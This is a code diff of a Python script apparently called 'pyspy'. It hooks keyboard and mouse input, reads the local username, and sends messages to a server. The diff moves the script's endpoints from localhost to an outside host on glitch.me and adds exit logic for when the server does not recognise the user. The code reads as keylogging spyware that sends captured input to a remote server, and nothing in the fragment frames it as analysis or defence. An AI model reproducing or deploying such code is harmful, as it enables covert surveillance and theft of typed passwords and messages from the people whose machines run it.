@@ -13,17 +13,25 @@ mouse = Controller()
 message = ""
 user = getpass.getuser()
 
-URL = 'http://localhost:3000/newmessage'
-initReq = 'http://localhost:3000/inituser'
-getusersReq = 'http://localhost:3000/users'
+# URL = 'http://localhost:3000/newmessage'
+# initReq = 'http://localhost:3000/inituser'
+# getusersReq = 'http://localhost:3000/users'
+
+URL = 'https://grishadev-pyspy.glitch.me/newmessage'
+initReq = 'https://grishadev-pyspy.glitch.me/inituser'
+getusersReq = 'https://grishadev-pyspy.glitch.me/users'
 # URL = 'https://grishadev-pyspy.glitch.me/newmessage'
 
 def init():
+    r = None
     try:
         r = requests.post(initReq,data={"user":user})
         print(r.status_code, r.reason)
     except:
         print("Error sending request")
+        destroy()
+
+    if r.status_code == 404:
         destroy()
 
 def on_press(key):
@@ -70,11 +78,17 @@ def getUsers():
     except:
         print("Error sending request")
 
-    if r is not None:
-        usersjson = r.json()
-        users = usersjson['users']
-        if user not in users:
-            destroy()
+    users = []
+
+    try:
+        if r is not None:
+            usersjson = r.json()
+            users = usersjson['users']
+    except:
+        print("Errorrr")
+
+    if user not in users:
+        destroy()
 
 def destroy():
     sys.exit()
